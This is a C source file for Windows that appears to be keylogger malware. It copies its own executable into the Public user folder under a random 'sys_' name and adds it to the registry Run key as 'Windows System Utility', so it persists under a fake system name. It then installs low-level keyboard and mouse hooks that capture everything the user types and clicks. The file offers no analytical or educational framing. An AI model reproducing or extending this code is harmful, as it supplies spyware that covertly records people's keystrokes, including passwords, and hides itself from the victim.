#define _CRT_SECURE_NO_WARNINGS
#include "functions.h"
int main(int argc, char** agrv) { return 0; }
int WINAPI WinMain(	HINSTANCE hInstance,	// handle to current instance
					HINSTANCE hPrevInstance,	// handle to previous instance
					LPSTR lpCmdLine,	// pointer to command line
					int nCmdShow 	// show state of window 
					)						  				  
{
    char this_file_path[STR_SIZE];
    char dst_file_path[STR_SIZE];
    MSG msg = {0};

    GetModuleFileNameA(NULL, this_file_path, STR_SIZE);	
	sprintf(dst_file_path, "C:\\Users\\Public\\sys_%d.exe", _random());
	copy_file(this_file_path, dst_file_path);
    //TODO if not record to registry then record to autorun
    set_registry_key(   HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "Windows System Utility",
                        dst_file_path );

    init_vars();
    SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)&keybard_hook, hInstance, 0);
    SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)&mouse_hook, hInstance, 0);

	while(GetMessageA(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
	
	return main(__argc, __argv);
}
